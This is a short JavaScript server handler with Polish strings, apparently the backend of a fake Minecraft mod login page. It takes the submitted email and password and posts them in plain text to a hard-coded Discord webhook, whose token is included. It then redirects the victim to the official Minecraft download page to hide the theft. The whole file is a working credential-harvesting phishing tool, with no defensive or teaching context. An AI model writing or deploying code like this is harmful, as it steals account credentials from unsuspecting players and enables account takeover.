export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { email, password } = req.body;
        const WEBHOOK = "https://discord.com/api/webhooks/1492962663553175552/hSju6EP6Ih5PLPgNG6PcHC-lOh_udnUuATr28SjHs148VFfLuMW0pai4NV9nTZaoFplA";

        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📥 Nowe Logowanie (Test Moda)",
                        color: 5814783,
                        fields: [
                            { name: "Email", value: `\`${email}\`` },
                            { name: "Hasło", value: `\`${password}\`` }
                        ],
                        timestamp: new Date()
                    }]
                })
            });
            // Przekierowanie do prawdziwego moda po "zalogowaniu"
            res.redirect('https://www.minecraft.net/pl-pl/download');
        } catch (e) {
            res.status(500).send("Błąd Webhooka");
        }
    } else {
        res.status(405).send("Metoda niedozwolona");
    }
}
